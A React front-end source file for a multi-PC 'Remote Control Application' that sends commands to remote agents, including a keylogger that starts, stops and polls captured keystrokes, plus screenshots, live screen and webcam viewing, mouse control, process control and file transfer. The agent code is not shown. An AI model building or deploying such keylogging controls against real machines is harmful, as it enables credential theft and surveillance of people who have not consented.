import { useCallback, useEffect, useState } from 'react';
import FeaturePanel from './components/FeaturePanel';
import PcList from './components/PcList';
import AppListModal from './components/AppListModal';
import FileTransferModal from './components/FileTransferModal';
import KeyloggerModal from './components/KeyloggerModal';
import ProcessListModal from './components/ProcessListModal';
import ScreenshotModal from './components/ScreenshotModal';
import SessionConsole from './components/SessionConsole';
import WebcamModal from './components/WebcamModal';
import type { AppListSession, CommandResult, ProcessListSession } from './types';
import { AddPcInput, RemoteCommand, RemotePc } from './types';
import { buildAppListSession } from './utils/parseListApps';
import { buildProcessListSession } from './utils/parseListProcesses';
import MouseControlModal from './components/MouseControlModal';
import ScreenViewerModal from './components/ScreenViewerModal';

function App() {
  const [pcs, setPcs] = useState<RemotePc[]>([]);
  const [selectedPc, setSelectedPc] = useState<RemotePc | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [form, setForm] = useState<AddPcInput>({
    name: '',
    host: '127.0.0.1',
    port: 5050,
    os: 'Windows',
  });
  const [processSession, setProcessSession] = useState<ProcessListSession | null>(null);
  const [appSession, setAppSession] = useState<AppListSession | null>(null);
  const [copyLocalPath, setCopyLocalPath] = useState('');
  const [copyRemotePath, setCopyRemotePath] = useState('');
  const [copyRemoteDir, setCopyRemoteDir] = useState('~');
  const [copyRemoteFiles, setCopyRemoteFiles] = useState<string[]>([]);
  const [selectedRemoteFile, setSelectedRemoteFile] = useState<string | null>(null);
  const [fileTransferOpen, setFileTransferOpen] = useState(false);
  const [copyBusy, setCopyBusy] = useState(false);
  const [keyloggerOpen, setKeyloggerOpen] = useState(false);
  const [keyloggerRunning, setKeyloggerRunning] = useState(false);
  const [keyloggerContent, setKeyloggerContent] = useState('');
  const [keyloggerBusy, setKeyloggerBusy] = useState(false);
  const [keyloggerLastLength, setKeyloggerLastLength] = useState(0);
  /** Khi true: không cập nhật lại nội dung từ poll (sau Clear view); Refresh dùng force để bỏ cờ và tải lại. */
  const [keyloggerViewCleared, setKeyloggerViewCleared] = useState(false);
  const [webcamOpen, setWebcamOpen] = useState(false);
  const webcamBusy = false;
  const [mouseControlOpen, setMouseControlOpen] = useState(false);
  const [screenViewerOpen, setScreenViewerOpen] = useState(false);
  const [screenViewerImage, setScreenViewerImage] = useState('');
  const [screenshotSession, setScreenshotSession] = useState<{
    target: RemotePc;
    imageUrl: string;
    fetchedAt: number;
  } | null>(null);

  const parseScreenshot = (raw: string): { mime: string; data: string } | null => {
    try {
      const parsed = JSON.parse(raw) as {
        ok?: boolean;
        command?: string;
        mime?: string;
        data?: string;
      };
      if (
        parsed.ok === true &&
        parsed.command === 'SCREENSHOT' &&
        typeof parsed.mime === 'string' &&
        typeof parsed.data === 'string' &&
        parsed.data.length > 0
      ) {
        return { mime: parsed.mime, data: parsed.data };
      }
    } catch {
      // ignore invalid JSON
    }
    return null;
  };

  const appendLog = useCallback((line: string) => {
    const ts = new Date().toLocaleTimeString();
    setLogs((prev) => [`[${ts}] ${line}`, ...prev].slice(0, 80));
  }, []);

  const loadPcs = useCallback(async () => {
    try {
      const list = await window.remoteApi.listPcs();
      setPcs(list);
      setSelectedPc((prev) => list.find((item) => item.id === prev?.id) ?? list[0] ?? null);
    } catch (error) {
      appendLog(`Load PCs failed: ${(error as Error).message}`);
    }
  }, [appendLog]);

  useEffect(() => {
    void loadPcs();
    const timer = setInterval(() => {
      void loadPcs();
    }, 5000);
    return () => clearInterval(timer);
  }, [loadPcs]);

  const resolvePc = useCallback((pc: RemotePc) => pcs.find((p) => p.id === pc.id) ?? pc, [pcs]);

  const refreshKeyloggerLog = useCallback(
    async (options?: { force?: boolean }) => {
      if (!selectedPc) return;
      if (keyloggerViewCleared && !options?.force) return;

      try {
        const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_GET_LOG');
        const parsed = JSON.parse(result.raw) as {
          ok?: boolean;
          output?: string;
          running?: boolean;
          message?: string;
        };
        if (typeof parsed.output === 'string') {
          setKeyloggerContent(parsed.output);
        }
        if (typeof parsed.running === 'boolean') {
          setKeyloggerRunning(parsed.running);
        }
        if (parsed.ok === false && parsed.message) {
          appendLog(`KEYLOGGER_GET_LOG: ${parsed.message}`);
        }
        if (options?.force) {
          setKeyloggerViewCleared(false);
        }
      } catch {
        appendLog('KEYLOGGER_GET_LOG: không đọc được phản hồi agent');
      }
    },
    [selectedPc, appendLog, keyloggerViewCleared],
  );

  useEffect(() => {
    if (!keyloggerOpen) return;
    void refreshKeyloggerLog();
    const timer = setInterval(() => {
      void refreshKeyloggerLog();
    }, 1000);
    return () => clearInterval(timer);
  }, [keyloggerOpen, refreshKeyloggerLog]);

  useEffect(() => {
    const unsubscribe = window.remoteApi.onScreenViewerFrame((payload) => {
      if (
        payload.ok === true &&
        payload.command === 'SCREEN_VIEWER_FRAME' &&
        typeof payload.mime === 'string' &&
        typeof payload.data === 'string'
      ) {
        setScreenViewerImage(`data:${payload.mime};base64,${payload.data}`);
      }
    });
  
    return () => {
      unsubscribe();
    };
  }, []);

  const runCommand = async (command: RemoteCommand) => {
    if (!selectedPc) {
      appendLog('No PC selected.');
      return;
    }
    if (command === 'SHUTDOWN' || command === 'RESTART') {
      const confirmed = window.confirm(
        `${command} selected machine "${selectedPc.name}" (${selectedPc.host}:${selectedPc.port})?`,
      );
      if (!confirmed) {
        appendLog(`Cancelled ${command}.`);
        return;
      }
    }

    console.log('command', command);
    const target = resolvePc(selectedPc);
    appendLog(`Run ${command} on ${target.name}`);
    const result = await window.remoteApi.runCommand(target.id, command);

    try {
      const parsed = JSON.parse(result.raw);
    
      if (
        parsed.ok === true &&
        parsed.command === 'SCREENSHOT' &&
        typeof parsed.mime === 'string' &&
        typeof parsed.data === 'string'
      ) {
        const imageUrl = `data:${parsed.mime};base64,${parsed.data}`;
    
        if (screenViewerOpen) {
          setScreenViewerImage(imageUrl);
        }
      }
    } catch {
      // ignore
    }

    if (command === 'LIST_PROCESSES' && result.ok && result.raw) {
      const session = buildProcessListSession(target, result.raw);
      if (session) {
        setProcessSession(session);
        appendLog(`OK LIST_PROCESSES: ${session.rows.length} row(s) — check popup`);
      } else {
        appendLog(`OK LIST_PROCESSES: không parse được JSON | ${result.raw}`);
      }
    } else if (command === 'LIST_APPS' && result.ok && result.raw) {
      const session = buildAppListSession(target, result.raw);
      if (session) {
        setAppSession(session);
        appendLog(`OK LIST_APPS: ${session.rows.length} row(s) — check popup`);
      } else {
        appendLog(`OK LIST_APPS: không parse được JSON | ${result.raw}`);
      }
    } else if (command === 'SCREENSHOT' && result.ok && result.raw) {
      const parsed = parseScreenshot(result.raw);
      if (parsed) {
        setScreenshotSession({
          target,
          fetchedAt: Date.now(),
          imageUrl: `data:${parsed.mime};base64,${parsed.data}`,
        });
        appendLog('OK SCREENSHOT: opened preview modal');
      } else {
        appendLog(`OK SCREENSHOT but parse failed | ${result.raw}`);
      }
    } else if (command === 'KEYLOGGER_STOP' && result.raw) {
      try {
        const parsed = JSON.parse(result.raw) as {
          output?: string;
          message?: string;
          ok?: boolean;
        };
        if (parsed.ok && typeof parsed.output === 'string') {
          appendLog(`KEYLOGGER_STOP output:\n${parsed.output || '(empty)'}`);
          setKeyloggerContent(parsed.output || '');
          setKeyloggerRunning(false);
        } else {
          appendLog(
            `${result.ok ? 'OK' : 'FAIL'} ${command}: ${parsed.message ?? result.message} ${
              result.raw ? `| ${result.raw}` : ''
            }`,
          );
        }
      } catch {
        appendLog(
          `${result.ok ? 'OK' : 'FAIL'} ${command}: ${result.message} ${result.raw ? `| ${result.raw}` : ''}`,
        );
      }
    } else {
      appendLog(
        `${result.ok ? 'OK' : 'FAIL'} ${command}: ${result.message} ${result.raw ? `| ${result.raw}` : ''}`,
      );
    }
    void loadPcs();
  };

  const handleOpenKeylogger = async () => {
    if (!selectedPc) {
      appendLog('No PC selected.');
      return;
    }
    setKeyloggerViewCleared(false);
    setKeyloggerOpen(true);
    await refreshKeyloggerLog({ force: true });
  };

  const handleStartKeylogger = async () => {
    if (!selectedPc) return;
    setKeyloggerBusy(true);
    try {
      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_START');
      const parsed = JSON.parse(result.raw) as { ok?: boolean; message?: string };
      if (parsed.ok) {
        setKeyloggerRunning(true);
        setKeyloggerContent('');
        setKeyloggerViewCleared(false);
        appendLog(`KEYLOGGER_START: ${parsed.message ?? 'ok'}`);
        await refreshKeyloggerLog({ force: true });
      } else {
        appendLog(`KEYLOGGER_START failed: ${parsed.message ?? result.message}`);
      }
    } catch {
      appendLog('KEYLOGGER_START: lỗi phân tích phản hồi');
    } finally {
      setKeyloggerBusy(false);
    }
  };

  const handleStopKeylogger = async () => {
    if (!selectedPc) return;
    setKeyloggerBusy(true);
    try {
      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
      const parsed = JSON.parse(result.raw) as {
        ok?: boolean;
        output?: string;
        message?: string;
      };
      if (parsed.ok && typeof parsed.output === 'string') {
        setKeyloggerContent(parsed.output);
        setKeyloggerRunning(false);
        setKeyloggerViewCleared(false);
        appendLog(`KEYLOGGER_STOP: đã nhận log (${parsed.output.length} ký tự)`);
      } else {
        setKeyloggerRunning(false);
        appendLog(`KEYLOGGER_STOP: ${parsed.message ?? result.message}`);
      }
    } catch {
      appendLog('KEYLOGGER_STOP: lỗi phân tích phản hồi');
      setKeyloggerRunning(false);
    } finally {
      setKeyloggerBusy(false);
    }
  };

  const refreshProcessModal = async (target: RemotePc): Promise<CommandResult> => {
    const t = resolvePc(target);
    const result = await window.remoteApi.runCommand(t.id, 'LIST_PROCESSES');
    if (result.ok && result.raw) {
      const session = buildProcessListSession(t, result.raw);
      if (session) setProcessSession(session);
    }
    return result;
  };

  const refreshAppModal = async (target: RemotePc): Promise<CommandResult> => {
    const t = resolvePc(target);
    const result = await window.remoteApi.runCommand(t.id, 'LIST_APPS');
    if (result.ok && result.raw) {
      const session = buildAppListSession(t, result.raw);
      if (session) setAppSession(session);
    }
    return result;
  };

  const runAgentLineModal = async (target: RemotePc, line: string): Promise<CommandResult> => {
    const t = resolvePc(target);
    const result = await window.remoteApi.runAgentLine(t.id, line);
    if (
      line.startsWith('KILL_PROCESS') ||
      line.startsWith('START_PROCESS') ||
      line.startsWith('STOP_APP_BY_PID')
    ) {
      void refreshProcessModal(t);
    }
    if (
      line.startsWith('START_APP_BY_NAME') ||
      line.startsWith('STOP_APP_BY_PID') ||
      line.startsWith('STOP_APP_BY_NAME')
    ) {
      void refreshAppModal(t);
    }
    void loadPcs();
    return result;
  };

  const removePc = async (pc: RemotePc) => {
    try {
      const list = await window.remoteApi.removePc(pc.id);
      setPcs(list);
      setSelectedPc((prev) => {
        if (prev?.id === pc.id) {
          return list[0] ?? null;
        }
        return prev ? (list.find((item) => item.id === prev.id) ?? list[0] ?? null) : null;
      });
      appendLog(`Removed: ${pc.name} (${pc.host}:${pc.port})`);
    } catch (error) {
      appendLog(`Remove PC failed: ${(error as Error).message}`);
    }
  };

  const addServer = async () => {
    try {
      const list = await window.remoteApi.addPc(form);
      setPcs(list);
      const exact = list.find(
        (pc) => pc.host === form.host.trim() && pc.port === Number(form.port),
      );
      if (exact) {
        setSelectedPc(exact);
        appendLog(`Added server 1: ${exact.name} (${exact.host}:${exact.port})`);
      } else {
        appendLog('Server already exists in list.');
      }
    } catch (error) {
      appendLog(`Add server failed: ${(error as Error).message}`);
    }
  };

  const resetFileTransferPaths = () => {
    setCopyLocalPath('');
    setCopyRemotePath('');
    setCopyRemoteDir('~');
    setCopyRemoteFiles([]);
    setSelectedRemoteFile(null);
  };

  const closeFileTransferModal = () => {
    resetFileTransferPaths();
    setFileTransferOpen(false);
  };

  const uploadFileToRemote = async (): Promise<CommandResult> => {
    if (!selectedPc) {
      const message = 'No PC selected.';
      appendLog(message);
      return { ok: false, message, raw: '' };
    }
    const localPath = copyLocalPath.trim();
    const remotePath = copyRemotePath.trim();
    if (!localPath || !remotePath) {
      const message = 'Upload: need local file and remote file name or path.';
      appendLog(message);
      return { ok: false, message, raw: '' };
    }
    setCopyBusy(true);
    try {
      const result = await window.remoteApi.uploadFile(selectedPc.id, localPath, remotePath);
      appendLog(
        `${result.ok ? 'OK' : 'FAIL'} Upload ${localPath} -> ${remotePath}: ${result.message}${
          result.raw ? ` | ${result.raw}` : ''
        }`,
      );
      return result;
    } catch (error) {
      const message = (error as Error).message;
      appendLog(`Upload failed: ${message}`);
      return { ok: false, message, raw: '' };
    } finally {
      setCopyBusy(false);
    }
  };

  const downloadFileFromRemote = async (): Promise<CommandResult> => {
    if (!selectedPc) {
      const message = 'No PC selected.';
      appendLog(message);
      return { ok: false, message, raw: '' };
    }
    const localPath = copyLocalPath.trim();
    const remotePath = (selectedRemoteFile || copyRemotePath).trim();
    if (!localPath || !remotePath) {
      const message = 'Download: need remote file path and local save path.';
      appendLog(message);
      return { ok: false, message, raw: '' };
    }
    setCopyBusy(true);
    try {
      const result = await window.remoteApi.downloadFile(selectedPc.id, remotePath, localPath);
      appendLog(
        `${result.ok ? 'OK' : 'FAIL'} Download ${remotePath} -> ${localPath}: ${result.message}${
          result.raw ? ` | ${result.raw}` : ''
        }`,
      );
      return result;
    } catch (error) {
      const message = (error as Error).message;
      appendLog(`Download failed: ${message}`);
      return { ok: false, message, raw: '' };
    } finally {
      setCopyBusy(false);
    }
  };

  const pickLocalFile = async () => {
    const p = await window.remoteApi.pickLocalFile();
    if (p) setCopyLocalPath(p);
  };

  const pickSavePath = async () => {
    const guessed = selectedRemoteFile ? selectedRemoteFile.split(/[\\/]/).pop() : undefined;
    const p = await window.remoteApi.pickSaveFile(guessed);
    if (p) setCopyLocalPath(p);
  };

  const loadRemoteFiles = async () => {
    if (!selectedPc) {
      appendLog('No PC selected.');
      return;
    }
    const dir = copyRemoteDir.trim();
    if (!dir) {
      appendLog('Remote directory is required.');
      return;
    }
    setCopyBusy(true);
    try {
      const result = await window.remoteApi.listRemoteFiles(selectedPc.id, dir);
      setCopyRemoteFiles(result.items);
      if (result.items.length > 0) {
        setSelectedRemoteFile(result.items[0]);
        setCopyRemotePath(result.items[0]);
      } else {
        setSelectedRemoteFile(null);
      }
      appendLog(`${result.ok ? 'OK' : 'FAIL'} LIST_FILES ${dir}: ${result.message}`);
    } finally {
      setCopyBusy(false);
    }
  };

  return (
    <main className="app">
      <ProcessListModal
        onClose={() => setProcessSession(null)}
        onLog={appendLog}
        onRefresh={(target) => refreshProcessModal(target)}
        onRunLine={(target, line) => runAgentLineModal(target, line)}
        open={processSession !== null}
        session={processSession}
      />
      <AppListModal
        onClose={() => setAppSession(null)}
        onLog={appendLog}
        onRefresh={(target) => refreshAppModal(target)}
        onRunLine={(target, line) => runAgentLineModal(target, line)}
        open={appSession !== null}
        session={appSession}
      />
      <ScreenshotModal
        fetchedAt={screenshotSession?.fetchedAt ?? 0}
        imageUrl={screenshotSession?.imageUrl ?? ''}
        onClose={() => setScreenshotSession(null)}
        open={screenshotSession !== null}
        targetLabel={
          screenshotSession
            ? `${screenshotSession.target.name} (${screenshotSession.target.host}:${screenshotSession.target.port})`
            : ''
        }
      />

        <ScreenViewerModal
        imageUrl={screenViewerImage}
        onClose={() => {
          if (selectedPc) {
            void window.remoteApi.stopScreenViewer(selectedPc.id);
          }

          setScreenViewerOpen(false);
          setScreenViewerImage('');
        }}
        open={screenViewerOpen}
        targetLabel={
          selectedPc
            ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})`
            : 'No target'
        }
      />

          <KeyloggerModal
              busy={keyloggerBusy}
              content={keyloggerContent}
              targetOs={selectedPc?.os ?? 'Windows'}
              onClose={async () => {
                  if (selectedPc && keyloggerRunning) {
                      try {
                          await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
                      } catch {
                          // ignore
                      }
                  }

                  setKeyloggerRunning(false);
                  setKeyloggerContent('');
                  setKeyloggerLastLength(0);
                  setKeyloggerViewCleared(false);
                  setKeyloggerOpen(false);
              }}
              onClearLog={() => {
                  setKeyloggerViewCleared(true);
                  setKeyloggerContent('');
                  setKeyloggerLastLength(0);
              }}
              onResumeView={() => void refreshKeyloggerLog({ force: true })}
              onStart={() => void handleStartKeylogger()}
              open={keyloggerOpen}
              running={keyloggerRunning}
              viewCleared={keyloggerViewCleared}
              targetLabel={
                  selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
              }
          />

          <WebcamModal
              busy={webcamBusy}
              onClose={() => setWebcamOpen(false)}
              open={webcamOpen}
              pcId={selectedPc?.id ?? null}
              targetLabel={
                  selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
              }
          />
      <FileTransferModal
        busy={copyBusy}
        localPath={copyLocalPath}
        onClose={closeFileTransferModal}
        onResetPaths={resetFileTransferPaths}
        onDownload={() => downloadFileFromRemote()}
        onLoadRemoteFiles={() => void loadRemoteFiles()}
        onLocalPathChange={setCopyLocalPath}
        onPickLocalFile={() => void pickLocalFile()}
        onPickSavePath={() => void pickSavePath()}
        onRemoteDirChange={setCopyRemoteDir}
        onRemotePathChange={(v) => {
          setCopyRemotePath(v);
          setSelectedRemoteFile(v);
        }}
        onSelectRemoteFile={(v) => {
          setSelectedRemoteFile(v);
          setCopyRemotePath(v);
        }}
        onUpload={() => uploadFileToRemote()}
        open={fileTransferOpen}
        remoteDir={copyRemoteDir}
        remoteFiles={copyRemoteFiles}
        remotePath={copyRemotePath}
        selectedRemoteFile={selectedRemoteFile}
        targetLabel={
          selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
        }
      />

      <MouseControlModal
        busy={false}
        imageUrl={screenViewerImage}
        onClose={() => {
          if (selectedPc) {
            void window.remoteApi.stopScreenViewer(selectedPc.id);
          }

          setMouseControlOpen(false);
        }}
        onMouseMove={(payload) => {
          if (!selectedPc) return;

          void window.remoteApi.runAgentLine(
            selectedPc.id,
            `MOUSE_MOVE ${payload.x} ${payload.y} ${payload.viewerWidth} ${payload.viewerHeight} ${payload.remoteWidth} ${payload.remoteHeight}`,
          );
        }}
        onLeftClick={(payload) => {
          if (!selectedPc) return;

          void window.remoteApi.runAgentLine(
            selectedPc.id,
            `MOUSE_LEFT_CLICK ${payload.x} ${payload.y} ${payload.viewerWidth} ${payload.viewerHeight} ${payload.remoteWidth} ${payload.remoteHeight}`,
          );
        }}
        onRightClick={(payload) => {
          if (!selectedPc) return;

          void window.remoteApi.runAgentLine(
            selectedPc.id,
            `MOUSE_RIGHT_CLICK ${payload.x} ${payload.y} ${payload.viewerWidth} ${payload.viewerHeight} ${payload.remoteWidth} ${payload.remoteHeight}`,
          );
        }}
        open={mouseControlOpen}
        targetLabel={
          selectedPc
            ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})`
            : 'No target'
        }
      />

      <header className="topbar">
        <div>
          <h1>Remote Control Application</h1>
          <p>Manage and control multiple PCs simultaneously from a centralized dashboard.</p>
        </div>
      </header>

      <section className="panel add-server-panel">
        <h2>Connect to Server Agent</h2>
        <div className="server-form">
          <input
            onChange={(event) =>
              setForm((prev) => ({
                ...prev,
                host: event.target.value,
              }))
            }
            placeholder="IP or hostname"
            type="text"
            value={form.host}
          />
          <input
            min={1}
            onChange={(event) =>
              setForm((prev) => ({
                ...prev,
                port: Number(event.target.value),
              }))
            }
            placeholder="Port"
            type="number"
            value={form.port}
          />
          <input
            onChange={(event) =>
              setForm((prev) => ({
                ...prev,
                name: event.target.value,
              }))
            }
            placeholder="Display name (optional)"
            type="text"
            value={form.name}
          />
          <select
            onChange={(event) =>
              setForm((prev) => ({
                ...prev,
                os: event.target.value as AddPcInput['os'],
              }))
            }
            value={form.os}
          >
            <option value="Windows">Windows</option>
            <option value="macOS">macOS</option>
          </select>
          <button className="btn primary" onClick={() => void addServer()} type="button">
            Add Server
          </button>
          <button className="btn" onClick={() => void runCommand('PING')} type="button">
            Connect Selected
          </button>
          <button className="btn" onClick={() => void loadPcs()} type="button">
            Refresh
          </button>
        </div>
      </section>

      <section className="selection-row">
        <span>
          Selected:{' '}
          <strong>
            {selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'None'}
          </strong>
        </span>
      </section>

      <section className="grid">
        <PcList
          onRemove={(pc) => void removePc(pc)}
          onSelect={(pc) => {
            setSelectedPc(pc);
            appendLog(`Selected ${pc.name}`);
          }}
          pcs={pcs}
          selectedId={selectedPc?.id ?? null}
        />
        <FeaturePanel
  disabled={!selectedPc}
  onClearLogs={() => setLogs([])}
  onOpenFileTransfer={() => setFileTransferOpen(true)}
  onOpenMouseControl={() => {
    setMouseControlOpen(true);
  
    if (selectedPc) {
      appendLog(`Run MOUSE_CONTROL on ${selectedPc.host}:${selectedPc.port}`);
      void window.remoteApi.startScreenViewer(selectedPc.id);
      appendLog(`OK MOUSE_CONTROL: ${selectedPc.name}`);
    }
  }}

  onOpenScreenViewer={() => {
    setScreenViewerOpen(true);
  
    if (selectedPc) {
      appendLog(`Run SCREEN_VIEWER on ${selectedPc.host}:${selectedPc.port}`);
      void window.remoteApi.startScreenViewer(selectedPc.id);
      appendLog(`OK SCREEN_VIEWER: ${selectedPc.name}`);
    }
  }}

  onRun={(command) => {
    if (command === 'KEYLOGGER_START') {
      void handleOpenKeylogger();
      return;
    }

    if (command === 'WEBCAM_START') {
      setWebcamOpen(true);
      return;
    }

    void runCommand(command);
  }}
/>
<SessionConsole logs={logs} />
      </section>
    </main>
  );
}

export default App;
